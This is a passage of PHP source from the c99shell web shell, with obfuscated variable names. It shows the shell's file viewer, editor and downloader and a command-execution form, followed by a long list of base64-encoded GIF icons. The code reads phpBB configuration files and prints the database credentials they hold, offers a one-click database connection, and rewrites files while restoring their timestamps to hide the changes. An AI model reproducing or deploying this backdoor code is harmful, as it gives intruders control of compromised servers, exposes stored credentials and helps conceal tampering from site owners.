htmlspecialchars($spa71965) . '" size="' . (strlen($spa71965) + 2) . '"><br>Display in text-area<input type="checkbox" name="cmd_txt" value="1" checked><input type=hidden name="d" value="' . htmlspecialchars($sp549585) . '"><br><input type=submit name=submit value="Execute"></form>'; } elseif ($spf9c77a == 'sdb') { echo '<pre>'; var_dump(unserialize(base64_decode($sp7185b7))); echo '</pre>'; } elseif ($spf9c77a == 'code') { if (ereg('php' . 'BB 2.(.*) auto-generated config file', $sp7185b7)) { $spc5ba94 = explode('
', $sp7185b7); if (count($spc5ba94 == 18)) { include $sp549585 . $sp77bd8d; echo '<b>phpBB configuration is detected in this file!<br>'; if ($sp3b7f96 == 'mysql4') { $sp3b7f96 = 'mysql'; } if ($sp3b7f96 == 'mysql') { echo '<a href="' . $sp4f5f94 . 'act=sql&sql_server=' . htmlspecialchars($sp85e790) . '&sql_login=' . htmlspecialchars($spbff850) . '&sql_passwd=' . htmlspecialchars($spe45829) . '&sql_port=3306&sql_db=' . htmlspecialchars($sp21feae) . '"><b><u>Connect to DB</u></b></a><br><br>'; } else { echo 'But, you can\'t connect to forum sql-base, because db-software="' . $sp3b7f96 . '" is not supported by c99shell. Please, report us for fix.'; } echo 'Parameters for manual connect:<br>'; $sp83fef7 = array('dbms' => $sp3b7f96, 'dbhost' => $sp85e790, 'dbname' => $sp21feae, 'dbuser' => $spbff850, 'dbpasswd' => $spe45829); foreach ($sp83fef7 as $spf38c9d => $spc85aba) { echo htmlspecialchars($spf38c9d) . '=\'' . htmlspecialchars($spc85aba) . '\'<br>'; } echo '</b><hr size="1" noshade>'; } } echo '<div style="border : 0px solid #FFFFFF; padding: 1em; margin-top: 1em; margin-bottom: 1em; margin-right: 1em; margin-left: 1em; background-color: ' . $spbd427f . ';">'; if (!empty($spd39f62)) { @ob_clean(); } highlight_file($sp549585 . $sp77bd8d); if (!empty($spd39f62)) { c99shexit(); } echo '</div>'; } elseif ($spf9c77a == 'download') { @ob_clean(); header('Content-type: application/octet-stream'); header('Content-length: ' . filesize($sp549585 . $sp77bd8d)); header('Content-disposition: attachment; filename="' . $sp77bd8d . '";'); echo $sp7185b7; die; } elseif ($spf9c77a == 'notepad') { @ob_clean(); header('Content-type: text/plain'); header('Content-disposition: attachment; filename="' . $sp77bd8d . '.txt";'); echo $sp7185b7; die; } elseif ($spf9c77a == 'img') { $sp1f04e1 = getimagesize($sp549585 . $sp77bd8d); if (!$spd39f62) { if (empty($spe48fa8)) { $spe48fa8 = 20; } $sp3bb90a = $sp1f04e1[0] / 100 * $spe48fa8; $spa5cd8e = $sp1f04e1[1] / 100 * $spe48fa8; echo '<center><b>Size:</b>&nbsp;'; $sp3ffab6 = array('100', '50', '20'); foreach ($sp3ffab6 as $spc85aba) { echo '<a href="' . $sp4f5f94 . 'act=f&f=' . urlencode($sp77bd8d) . '&ft=img&d=' . urlencode($sp549585) . '&imgsize=' . $spc85aba . '">'; if ($spe48fa8 != $spc85aba) { echo $spc85aba; } else { echo '<u>' . $spc85aba . '</u>'; } echo '</a>&nbsp;&nbsp;&nbsp;'; } echo '<br><br><img src="' . $sp4f5f94 . 'act=f&f=' . urlencode($sp77bd8d) . '&ft=img&white=1&d=' . urlencode($sp549585) . '" width="' . $sp3bb90a . '" height="' . $spa5cd8e . '" border="1"></center>'; } else { @ob_clean(); $sp0beeb7 = explode($sp77bd8d, '.'); $sp0beeb7 = $sp0beeb7[count($sp0beeb7) - 1]; header('Content-type: ' . $sp1f04e1['mime']); readfile($sp549585 . $sp77bd8d); die; } } elseif ($spf9c77a == 'edit') { if (!empty($sp58b8eb)) { if ($spe87a04) { $spa7106d = stat($sp549585 . $sp77bd8d); } $spe2e680 = fopen($sp549585 . $sp77bd8d, 'w'); if (!$spe2e680) { echo '<b>Can\'t write to file!</b>'; } else { echo '<b>Saved!</b>'; fwrite($spe2e680, $sp386584); fclose($spe2e680); if ($spe87a04) { touch($sp549585 . $sp77bd8d, $spa7106d[9], $spa7106d[8]); } $sp7185b7 = $sp386584; } } $sp1098b7 = count(explode('
', $sp7185b7)); if ($sp1098b7 < 10) { $sp1098b7 = 10; } if ($sp1098b7 > 30) { $sp1098b7 = 30; } echo '<form action="' . $sp4f5f94 . 'act=f&f=' . urlencode($sp77bd8d) . '&ft=edit&d=' . urlencode($sp549585) . '" method=POST><input type=submit name=submit value="Save">&nbsp;<input type="reset" value="Reset">&nbsp;<input type="button" onclick="location.href=\'' . addslashes($sp4f5f94 . 'act=ls&d=' . substr($sp549585, 0, -1)) . '\';" value="Back"><br><textarea name="edit_text" cols="122" rows="' . $sp1098b7 . '">' . htmlspecialchars($sp7185b7) . '</textarea></form>'; } elseif (!empty($spf9c77a)) { echo '<center><b>Manually selected type is incorrect. If you think, it is mistake, please send us url and dump of $GLOBALS.</b></center>'; } else { echo '<center><b>Unknown extension (' . $sp0beeb7 . '), please, select type manually.</b></center>'; } } } } else { @ob_clean(); $spbe22e1 = array('arrow_ltr' => 'R0lGODlhJgAWAIAAAAAAAP///yH5BAUUAAEALAAAAAAmABYAAAIvjI+py+0PF4i0gVvzuVxXDnoQ' . 'SIrUZGZoerKf28KjPNPOaku5RfZ+uQsKh8RiogAAOw==', 'back' => 'R0lGODlhFAAUAKIAAAAAAP///93d3cDAwIaGhgQEBP///wAAACH5BAEAAAYALAAAAAAUABQAAAM8' . 'aLrc/jDKSWWpjVysSNiYJ4CUOBJoqjniILzwuzLtYN/3zBSErf6kBW+gKRiPRghPh+EFK0mOUEqt' . 'Wg0JADs=', 'buffer' => 'R0lGODlhFAAUAKIAAAAAAP////j4+N3d3czMzLKysoaGhv///yH5BAEAAAcALAAAAAAUABQAAANo' . 'eLrcribG90y4F1Amu5+NhY2kxl2CMKwrQRSGuVjp4LmwDAWqiAGFXChg+xhnRB+ptLOhai1crEmD' . 'Dlwv4cEC46mi2YgJQKaxsEGDFnnGwWDTEzj9jrPRdbhuG8Cr/2INZIOEhXsbDwkAOw==', 'change' => 'R0lGODlhFAAUAMQfAL3hj7nX+pqo1ejy/f7YAcTb+8vh+6FtH56WZtvr/RAQEZecx9Ll/PX6/v3+' . '/3eHt6q88eHu/ZkfH3yVyIuQt+72/kOm99fo/P8AZm57rkGS4Hez6pil9oep3GZmZv///yH5BAEA' . 'AB8ALAAAAAAUABQAAAWf4CeOZGme6NmtLOulX+c4TVNVQ7e9qFzfg4HFonkdJA5S54cbRAoFyEOC' . 'wSiUtmYkkrgwOAeA5zrqaLldBiNMIJeD266XYTgQDm5Rx8mdG+oAbSYdaH4Ga3c8JBMJaXQGBQgA' . 'CHkjE4aQkQ0AlSITan+ZAQqkiiQPj1AFAaMKEKYjD39QrKwKAa8nGQK8Agu/CxTCsCMexsfIxjDL' . 'zMshADs=', 'delete' => 'R0lGODlhFAAUAOZZAPz8/NPFyNgHLs0YOvPz8/b29sacpNXV1fX19cwXOfDw8Kenp/n5+etgeunp' . '6dcGLMMpRurq6pKSktvb2+/v7+1wh3R0dPnP17iAipxyel9fX7djcscSM93d3ZGRkeEsTevd4LCw' . 'sGRkZGpOU+IfQ+EQNoh6fdIcPeHh4YWFhbJQYvLy8ui+xm5ubsxccOx8kcM4UtY9WeAdQYmJifWv' . 'vHx8fMnJycM3Uf3v8rRue98ONbOzs9YFK5SUlKYoP+Tk5N0oSufn57ZGWsQrR9kIL5CQkOPj42Vl' . 'ZeAPNudAX9sKMPv7+15QU5ubm39/f8e5u4xiatra2ubKz8PDw+pfee9/lMK0t81rfd8AKf///wAA' . 'AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA' . 'AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAACH5' . 'BAEAAFkALAAAAAAUABQAAAesgFmCg4SFhoeIhiUfIImIMlgQB46GLAlYQkaFVVhSAIZLT5cbEYI4' . 'STo5MxOfhQwBA1gYChckQBk1OwiIALACLkgxJilTBI69RFhDFh4HDJRZVFgPPFBR0FkNWDdMHA8G' . 'BZTaMCISVgMC4IkVWCcaPSi96OqGNFhKI04dgr0QWFcKDL3A4uOIjVZZABxQIWDBLkIEQrRoQsHQ' . 'jwVFHBgiEGQFIgQasYkcSbJQIAA7', 'download' => 'R0lGODlhFAAUALMIAAD/AACAAIAAAMDAwH9/f/8AAP///wAAAP///wAAAAAAAAAAAAAAAAAAAAAA' . 'AAAAACH5BAEAAAgALAAAAAAUABQAAAROEMlJq704UyGOvkLhfVU4kpOJSpx5nF9YiCtLf0SuH7pu' . 'EYOgcBgkwAiGpHKZzB2JxADASQFCidQJsMfdGqsDJnOQlXTP38przWbX3qgIADs=', 'forward' => 'R0lGODlhFAAUAPIAAAAAAP///93d3cDAwIaGhgQEBP///wAAACH5BAEAAAYALAAAAAAUABQAAAM8' . 'aLrc/jDK2Qp9xV5WiN5G50FZaRLD6IhE66Lpt3RDbd9CQFSE4P++QW7He7UKPh0IqVw2l0RQSEqt' . 'WqsJADs=', 'home' => 'R0lGODlhFAAUALMAAAAAAP///+rq6t3d3czMzLKysoaGhmZmZgQEBP///wAAAAAAAAAAAAAAAAAA' . 'AAAAACH5BAEAAAkALAAAAAAUABQAAAR+MMk5TTWI6ipyMoO3cUWRgeJoCCaLoKO0mq0ZxjNSBDWS' . 'krqAsLfJ7YQBl4tiRCYFSpPMdRRCoQOiL4i8CgZgk09WfWLBYZHB6UWjCequwEDHuOEVK3QtgN/j' . 'VwMrBDZvgF+ChHaGeYiCBQYHCH8VBJaWdAeSl5YiW5+goBIRADs=', 'mode' => 'R0lGODlhHQAUALMAAAAAAP///6CgpN3d3czMzIaGhmZmZl9fX////wAAAAAAAAAAAAAAAAAAAAAA' . 'AAAAACH5BAEAAAgALAAAAAAdABQAAASBEMlJq70461m6/+AHZMUgnGiqniNWHHAsz3F7FUGu73xO' . '2BZcwGDoEXk/Uq4ICACeQ6fzmXTlns0ddle99b7cFvYpER55Z10Xy1lKt8wpoIsACrdaqBpYEYK/' . 'dH1LRWiEe0pRTXBvVHwUd3o6eD6OHASXmJmamJUSY5+gnxujpBIRADs=', 'refresh' => 'R0lGODlhEQAUALMAAAAAAP////Hx8erq6uPj493d3czMzLKysoaGhmZmZl9fXwQEBP///wAAAAAA' . 'AAAAACH5BAEAAAwALAAAAAARABQAAAR1kMlJq0Q460xR+GAoIMvkheIYlMyJBkJ8lm6YxMKi6zWY' . '3AKCYbjo/Y4EQqFgKIYUh8EvuWQ6PwPFQJpULpunrXZLrYKx20G3oDA7093Esv19q5O/woFu9ZAJ' . 'R3lufmWCVX13h3KHfWWMjGBDkpOUTTuXmJgRADs=', 'search' => 'R0lGODlhFAAUALMAAAAAAP///+rq6t3d3czMzMDAwLKysoaGhnd3d2ZmZl9fX01NTSkpKQQEBP//' . '/wAAACH5BAEAAA4ALAAAAAAUABQAAASn0Ml5qj0z5xr6+JZGeUZpHIqRNOIRfIYiy+a6vcOpHOap' . 's5IKQccz8XgK4EGgQqWMvkrSscylhoaFVmuZLgUDAnZxEBMODSnrkhiSCZ4CGrUWMA+LLDxuSHsD' . 'AkN4C3sfBX10VHaBJ4QfA4eIU4pijQcFmCVoNkFlggcMRScNSUCdJyhoDasNZ5MTDVsXBwlviRmr' . 'Cbq7C6sIrqawrKwTv68iyA6rDhEAOw==', 'setup' => 'R0lGODlhFAAUAMQAAAAAAP////j4+OPj493d3czMzMDAwLKyspaWloaGhnd3d2ZmZl9fX01NTUJC' . 'QhwcHP///wAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAACH5BAEA' . 'ABAALAAAAAAUABQAAAWVICSKikKWaDmuShCUbjzMwEoGhVvsfHEENRYOgegljkeg0PF4KBIFRMIB' . 'qCaCJ4eIGQVoIVWsTfQoXMfoUfmMZrgZ2GNDPGII7gJDLYErwG1vgW8CCQtzgHiJAnaFhyt2dwQE' . 'OwcMZoZ0kJKUlZeOdQKbPgedjZmhnAcJlqaIqUesmIikpEixnyJhulUMhg24aSO6YyEAOw==', 'small_dir' => 'R0lGODlhEwAQALMAAAAAAP///5ycAM7OY///nP//zv/OnPf39////wAAAAAAAAAAAAAAAAAAAAAA' . 'AAAAACH5BAEAAAgALAAAAAATABAAAARREMlJq7046yp6BxsiHEVBEAKYCUPrDp7HlXRdEoMqCebp' . '/4YchffzGQhH4YRYPB2DOlHPiKwqd1Pq8yrVVg3QYeH5RYK5rJfaFUUA3vB4fBIBADs=', 'small_unk' => 'R0lGODlhEAAQAHcAACH5BAEAAJUALAAAAAAQABAAhwAAAIep3BE9mllic3B5iVpjdMvh/MLc+y1U' . 'p9Pm/GVufc7j/MzV/9Xm/EOm99bn/Njp/a7Q+tTm/LHS+eXw/t3r/Nnp/djo/Nrq/fj7/9vq/Nfo' . '/Mbe+8rh/Mng+7jW+rvY+r7Z+7XR9dDk/NHk/NLl/LTU+rnX+8zi/LbV++fx/e72/vH3/vL4/u31' . '/e31/uDu/dzr/Orz/eHu/fX6/vH4/v////v+/3ez6vf7//T5/kGS4Pv9/7XV+rHT+r/b+rza+vP4' . '/uz0/urz/u71/uvz/dTn/M/k/N3s/dvr/cjg+8Pd+8Hc+sff+8Te+/D2/rXI8rHF8brM87fJ8nmP' . 'wr3N86/D8KvB8F9neEFotEBntENptENptSxUpx1IoDlfrTRcrZeeyZacxpmhzIuRtpWZxIuOuKqz' . '9ZOWwX6Is3WIu5im07rJ9J2t2Zek0m57rpqo1nKCtUVrtYir3vf6/46v4Yuu4WZvfr7P6sPS6sDQ' . '66XB6cjZ8a/K79/s/dbn/ezz/czd9mN0jKTB6ai/76W97niXz2GCwV6AwUdstXyVyGSDwnmYz4io' . '24Oi1a3B45Sy4ae944Ccz4Sj1n2GlgAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA' . 'AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA' . 'AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA' . 'AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA' . 'AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA' . 'AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA' . 'AAjnACtVCkCw4JxJAQQqFBjAxo0MNGqsABQAh6CFA3nk0MHiRREVDhzsoLQwAJ0gT4ToecSHAYMz' . 'aQgoDNCCSB4EAnImCiSBjUyGLobgXBTpkAA5I6pgmSkDz5cuMSz8yWlAyoCZFGb4SQKhASMBXJpM' . 'uSrQEQwkGjYkQCTAy6AlUMhWklQBw4MEhgSA6XPgRxS5ii40KLFgi4BGTEKAsCKXihESCzrsgSQC' . 'yIkUV+SqOYLCA4csAup86OGDkNw4BpQ4OaBFgB0TEyIUKqDwTRs4a9yMCSOmDBoyZu4sJKCgwIDj' . 'yAsokBkQADs=', 'multipage' => 'R0lGODlhCgAMAJEDAP/////3mQAAAAAAACH5BAEAAAMALAAAAAAKAAwAAAIj3IR' . 'pJhCODnovidAovBdMzzkixlXdlI2oZpJWEsSywLzRUAAAOw==', 'sort_asc' => 'R0lGODlhDgAJAKIAAAAAAP///9TQyICAgP///wAAAAAAAAAAACH5BAEAAAQALAAAAAAOAAkAAAMa' . 'SLrcPcE9GKUaQlQ5sN5PloFLJ35OoK6q5SYAOw==', 'sort_desc' => 'R0lGODlhDgAJAKIAAAAAAP///9TQyICAgP///wAAAAAAAAAAACH5BAEAAAQALAAAAAAOAAkAAAMb' . 'SLrcOjBCB4UVITgyLt5ch2mgSJZDBi7p6hIJADs=', 'sql_button_drop' => 'R0lGODlhCQALAPcAAAAAAIAAAACAAICAAAAAgIAAgACAgICAgMDAwP8AAAD/AP//AAAA//8A/wD/' . '/////wAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA' . 'AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAMwAAZgAAmQAAzAAA/wAzAAAzMwAzZgAzmQAzzAAz/wBm' . 'AABmMwBmZgBmmQBmzABm/wCZAACZMwCZZgCZmQCZzACZ/wDMAADMMwDMZgDMmQDMzADM/wD/AAD/' . 'MwD/ZgD/mQD/zAD//zMAADMAMzMAZjMAmTMAzDMA/zMzADMzMzMzZjMzmTMzzDMz/zNmADNmMzNm' . 'ZjNmmTNmzDNm/zOZADOZMzOZZjOZmTOZzDOZ/zPMADPMMzPMZjPMmTPMzDPM/zP/ADP/MzP/ZjP/' . 'mTP/zDP//2YAAGYAM2YAZmYAmWYAzGYA/2YzAGYzM2YzZmYzmWYzzGYz/2ZmAGZmM2ZmZmZmmWZm' . 'zGZm/2aZAGaZM2aZZmaZmWaZzGaZ/2bMAGbMM2bMZmbMmWbMzGbM/2b/AGb/M2b/Zmb/mWb/zGb/' . '/5kAAJkAM5kAZpkAmZkAzJkA/5kzAJkzM5kzZpkzmZkzzJkz/5lmAJlmM5lmZplmmZlmzJlm/5mZ' . 'AJmZM5mZZpmZmZmZzJmZ/5nMAJnMM5nMZpnMmZnMzJnM/5n/AJn/M5n/Zpn/mZn/zJn//8wAAMwA' . 'M8wAZswAmcwAzMwA/8wzAMwzM8wzZswzmcwzzMwz/8xmAMxmM8xmZsxmmcxmzMxm/8yZAMyZM8yZ' . 'ZsyZmcyZzMyZ/8zMAMzMM8zMZszMmczMzMzM/8z/AMz/M8z/Zsz/mcz/zMz///8AAP8AM/8AZv8A' . 'mf8AzP8A//8zAP8zM/8zZv8zmf8zzP8z//9mAP9mM/9mZv9mmf9mzP9m//+ZAP+ZM/+ZZv+Zmf+Z' . 'zP+Z///MAP/MM//MZv/Mmf/MzP/M////AP//M///Zv//mf//zP///yH5BAEAABAALAAAAAAJAAsA' . 'AAg4AP8JREFQ4D+CCBOi4MawITeFCg/iQhEPxcSBlFCoQ5Fx4MSKv1BgRGGMo0iJFC2ehHjSoMt/' . 'AQEAOw==', 'sql_button_empty' => 'R0lGODlhCQAKAPcAAAAAAIAAAACAAICAAAAAgIAAgACAgICAgMDAwP8AAAD/AP//AAAA//8A/wD/' . '/////wAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA' . 'AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAMwAAZgAAmQAAzAAA/wAzAAAzMwAzZgAzmQAzzAAz/wBm' . 'AABmMwBmZgBmmQBmzABm/wCZAACZMwCZZgCZmQCZzACZ/wDMAADMMwDMZgDMmQDMzADM/wD/AAD/' . 'MwD/ZgD/mQD/zAD//zMAADMAMzMAZjMAmTMAzDMA/zMzADMzMzMzZjMzmTMzzDMz/zNmADNmMzNm' . 'ZjNmmTNmzDNm/zOZADOZMzOZZjOZmTOZzDOZ/zPMADPMMzPMZjPMmTPMzDPM/zP/ADP/MzP/ZjP/' . 'mTP/zDP//2YAAGYAM2YAZmYAmWYAzGYA/2YzAGYzM2YzZmYzmWYzzGYz/2ZmAGZmM2ZmZmZmmWZm' . 'zGZm/2aZAGaZM2aZZmaZmWaZzGaZ/2bMAGbMM2bMZmbMmWbMzGbM/2b/AGb/M2b/Zmb/mWb/zGb/' . '/5kAAJkAM5kAZpkAmZkAzJkA/5kzAJkzM5kzZpkzmZkzzJkz/5lmAJlmM5lmZplmmZlmzJlm/5mZ' . 'AJmZM5mZZpmZmZmZzJmZ/5nMAJnMM5nMZpnMmZnMzJnM/5n/AJn/M5n/Zpn/mZn/zJn//8wAAMwA' . 'M8wAZswAmcwAzMwA/8wzAMwzM8wzZswzmcwzzMwz/8xmAMxmM8xmZsxmmcxmzMxm/8yZAMyZM8yZ' . 'ZsyZmcyZzMyZ/8zMAMzMM8zMZszMmczMzMzM/8z/AMz/M8z/Zsz/mcz/zMz///8AAP8AM/8AZv8A' . 'mf8AzP8A//8zAP8zM/8zZv8zmf8zzP8z//9mAP9mM/9mZv9mmf9mzP9m//+ZAP+ZM/+ZZv+Zmf+Z' . 'zP+Z///MAP/MM//MZv/Mmf/MzP/M////AP//M///Zv//mf//zP///yH5BAEAABAALAAAAAAJAAoA' . 'AAgjAP8JREFQ4D+CCBOiMMhQocKDEBcujEiRosSBFjFenOhwYUAAOw==', 'sql_button_insert' => 'R0lGODlhDQAMAPcAAAAAAIAAAACAAICAAAAAgIAAgACAgICAgMDAwP8AAAD/AP//AAAA//8A/wD/' . '/////wAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA' . 'AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAMwAAZgAAmQAAzAAA/wAzAAAzMwAzZgAzmQAzzAAz/wBm' . 'AABmMwBmZgBmmQBmzABm/wCZAACZMwCZZgCZmQCZzACZ/wDMAADMMwDMZgDMmQDMzADM/wD/AAD/' . 'MwD/ZgD/mQD/zAD//zMAADMAMzMAZjMAmTMAzDMA/zMzADMzMzMzZjMzmTMzzDMz/zNmADNmMzNm' . 'ZjNmmTNmzDNm/zOZADOZMzOZZjOZmTOZzDOZ/zPMADPMMzPMZjPMmTPMzDPM/zP/ADP/MzP/ZjP/' . 'mTP/zDP//2YAAGYAM2YAZmYAmWYAzGYA/2YzAGYzM2YzZmYzmWYzzGYz/2ZmAGZmM2ZmZmZmmWZm' . 'zGZm/2aZAGaZM2aZZmaZmWaZzGaZ/2bMAGbMM2bMZmbMmWbMzGbM/2b/AGb/M2b/Zmb/mWb/zGb/' . '/5kAAJkAM5kAZpkAmZkAzJkA/5kzAJkzM5kzZpkzmZkzzJkz/5lmAJlmM5lmZplmmZlmzJlm/5mZ' . 'AJmZM5mZZpmZmZmZzJmZ/5nMAJnMM5nMZpnMmZnMzJnM/5n/AJn/M5n/Zpn/mZn/zJn//8wAAMwA' . 'M8wAZswAmcwAzMwA/8wzAMwzM8wzZswzmcwzzMwz/8xmAMxmM8xmZsxmmcxmzMxm/8yZAMyZM8yZ' . 'ZsyZmcyZzMyZ/8zMAMzMM8zMZszMmczMzMzM/8z/AMz/M8z/Zsz/mcz/zMz///8AAP8AM/8AZv8A' . 'mf8AzP8A//8zAP8zM/8zZv8zmf8zzP8z//9mAP9mM/9mZv9mmf9mzP9m//+ZAP+ZM/+ZZv+Zmf+Z' . 'zP+Z///MAP/MM//MZv/Mmf/MzP/M////AP//M///Zv//mf//zP///yH5BAEAABAALAAAAAANAAwA' . 'AAgzAFEIHEiwoMGDCBH6W0gtoUB//1BENOiP2sKECzNeNIiqY0d/FBf+y0jR48eQGUc6JBgQADs=', 'up' => 'R0lGODlhFAAUALMAAAAAAP////j4+OPj493d3czMzLKysoaGhk1NTf///wAAAAAAAAAAAAAAAAAA' . 'AAAAACH5BAEAAAkALAAAAAAUABQAAAR0MMlJq734ns1PnkcgjgXwhcNQrIVhmFonzxwQjnie27jg' . '+4Qgy3XgBX4IoHDlMhRvggFiGiSwWs5XyDftWplEJ+9HQCyx2c1YEDRfwwfxtop4p53PwLKOjvvV' . 'IXtdgwgdPGdYfng1IVeJaTIAkpOUlZYfHxEAOw==', 'write' => 'R0lGODlhFAAUALMAAAAAAP///93d3czMzLKysoaGhmZmZl9fXwQEBP///wAAAAAAAAAAAAAAAAAA' . 'AAAAACH5BAEAAAkALAAAAAAUABQAAAR0MMlJqyzFalqEQJuGEQSCnWg6FogpkHAMF4HAJsWh7/ze' . 'EQYQLUAsGgM0Wwt3bCJfQSFx10yyBlJn8RfEMgM9X+3qHWq5iED5yCsMCl111knDpuXfYls+IK61' . 'LXd+WWEHLUd/ToJFZQOOj5CRjiCBlZaXIBEAOw==', 'ext_asp' => 'R0lGODdhEAAQALMAAAAAAIAAAACAAICAAAAAgIAAgACAgMDAwICAgP8AAAD/AP//AAAA//8A/wD/' . '/////ywAAAAAEAAQAAAESvDISasF2N6DMNAS8Bxfl1UiOZYe9aUwgpDTq6qP/IX0Oz7AXU/1eRgI' . 'D6HPhzjSeLYdYabsDCWMZwhg3WWtKK4QrMHohCAS+hABADs=', 'ext_mp3' => 'R0lGODlhEAAQACIAACH5BAEAAAYALAAAAAAQABAAggAAAP///4CAgMDAwICAAP//AAAAAAAAAANU' . 'aGrS7iuKQGsYIqpp6QiZRDQWYAILQQSA2g2o4QoASHGwvBbAN3GX1qXA+r1aBQHRZHMEDSYCz3fc' . 'IGtGT8wAUwltzwWNWRV3LDnxYM1ub6GneDwBADs=', 'ext_avi' => 'R0lGODlhEAAQACIAACH5BAEAAAUALAAAAAAQABAAggAAAP///4CAgMDAwP8AAAAAAAAAAAAAAANM' . 'WFrS7iuKQGsYIqpp6QiZ1FFACYijB4RMqjbY01DwWg44gAsrP5QFk24HuOhODJwSU/IhBYTcjxe4' . 'PYXCyg+V2i44XeRmSfYqsGhAAgA7', 'ext_cgi' => 'R0lGODlhEAAQAGYAACH5BAEAAEwALAAAAAAQABAAhgAAAJtqCHd3d7iNGa+HMu7er9GiC6+IOOu9' . 'DkJAPqyFQql/N/Dlhsyyfe67Af/SFP/8kf/9lD9ETv/PCv/cQ//eNv/XIf/ZKP/RDv/bLf/cMah6' . 'LPPYRvzgR+vgx7yVMv/lUv/mTv/fOf/MAv/mcf/NA//qif/MAP/TFf/xp7uZVf/WIP/OBqt/Hv/S' . 'Ev/hP+7OOP/WHv/wbHNfP4VzV7uPFv/pV//rXf/ycf/zdv/0eUNJWENKWsykIk9RWMytP//4iEpQ' . 'Xv/9qfbptP/uZ93GiNq6XWpRJ//iQv7wsquEQv/jRAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA' . 'AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA' . 'AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA' . 'AAAAAAAAAAAAAAAAAAAAAAeegEyCg0wBhIeHAYqIjAEwhoyEAQQXBJCRhQMuA5eSiooGIwafi4UM' . 'BagNFBMcDR4FQwwBAgEGSBBEFSwxNhAyGg6WAkwCBAgvFiUiOBEgNUc7w4ICND8PKCFAOi0JPNKD' . 'AkUnGTkRNwMS34MBJBgdRkJLCD7qggEPKxsJKiYTBweJkjhQkk7AhxQ9FqgLMGBGkG8KFCg8JKAi' . 'RYtMAgEAOw==', 'ext_cmd' => 'R0lGODlhEAAQACIAACH5BAEAAAcALAAAAAAQABAAggAAAP///4CAgMDAwAAAgICAAP//AAAAAANI' . 'eLrcJzDKCYe9+AogBvlg+G2dSAQAipID5XJDIM+0zNJFkdL3DBg6HmxWMEAAhVlPBhgYdrYhDQCN' . 'dmrYAMn1onq/YKpjvEgAADs=', 'ext_cpp' => 'R0lGODlhEAAQACIAACH5BAEAAAUALAAAAAAQABAAgv///wAAAAAAgICAgMDAwAAAAAAAAAAAAANC' . 'WLPc9XCASScZ8MlKicobBwRkEIkVYWqT4FICoJ5v7c6s3cqrArwinE/349FiNoFw44rtlqhOL4Ra' . 'Eq7YrLDE7a4SADs=', 'ext_ini' => 'R0lGODlhEAAQACIAACH5BAEAAAYALAAAAAAQABAAggAAAP///8DAwICAgICAAP//AAAAAAAAAANL' . 'aArB3ioaNkK9MNbHs6lBKIoCoI1oUJ4N4DCqqYBpuM6hq8P3hwoEgU3mawELBEaPFiAUAMgYy3VM' . 'SnEjgPVarHEHgrB43JvszsQEADs=', 'ext_diz' => 'R0lGODlhEAAQAHcAACH5BAEAAJUALAAAAAAQABAAhwAAAP///15phcfb6NLs/7Pc/+P0/3J+l9bs' . '/52nuqjK5/n///j///7///r//0trlsPn/8nn/8nZ5trm79nu/8/q/9Xt/9zw/93w/+j1/9Hr/+Dv' . '/d7v/73H0MjU39zu/9br/8ne8tXn+K6/z8Xj/LjV7dDp/6K4y8bl/5O42Oz2/7HW9Ju92u/9/8T3' . '/+L//+7+/+v6/+/6/9H4/+X6/+Xl5Pz//+/t7fX08vD//+3///P///H///P7/8nq/8fp/8Tl98zr' . '/+/z9vT4++n1/b/k/dny/9Hv/+v4/9/0/9fw/8/u/8vt/+/09xUvXhQtW4KTs2V1kw4oVTdYpDZX' . 'pVxqhlxqiExkimKBtMPL2Ftvj2OV6aOuwpqlulyN3cnO1wAAXQAAZSM8jE5XjgAAbwAAeURBYgAA' . 'dAAAdzZEaE9wwDZYpmVviR49jG12kChFmgYuj6+1xeLn7Nzj6pm20oeqypS212SJraCyxZWyz7PW' . '9c/o/87n/8DX7MHY7q/K5LfX9arB1srl/2+fzq290U14q7fCz6e2yXum30FjlClHc4eXr6bI+bTK' . '4rfW+NXe6Oby/5SvzWSHr+br8WuKrQAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA' . 'AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA' . 'AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA' . 